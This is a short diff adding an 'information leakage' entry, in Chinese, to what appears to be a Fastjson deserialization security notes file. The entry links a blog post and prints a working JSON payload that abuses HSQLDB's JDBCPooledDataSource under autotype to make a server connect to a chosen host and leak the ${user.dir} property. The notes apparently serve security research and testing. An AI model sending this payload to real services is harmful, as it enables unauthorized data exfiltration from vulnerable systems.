@@ -1241,3 +1241,12 @@ Fastjson默认会去除键、值外的空格、`\b`、`\n`、`\r`、`\f`等，�
 
 **https://www.sec-in.com/article/950**
 
+## 信息泄露
+
+https://b1ue.cn/archives/458.html
+
+在 fastjson 开启了 autotype 且没有可用的 rce gadget 的场景下可以用到。
+
+```
+{"@type":"org.hsqldb.jdbc.pool.JDBCPooledDataSource","url":"jdbc:hsqldb:http://127.0.0.1:2333/?${user.dir}","user":"sa","password":"","a":{"$ref":"$.pooledConnection"}}
+```
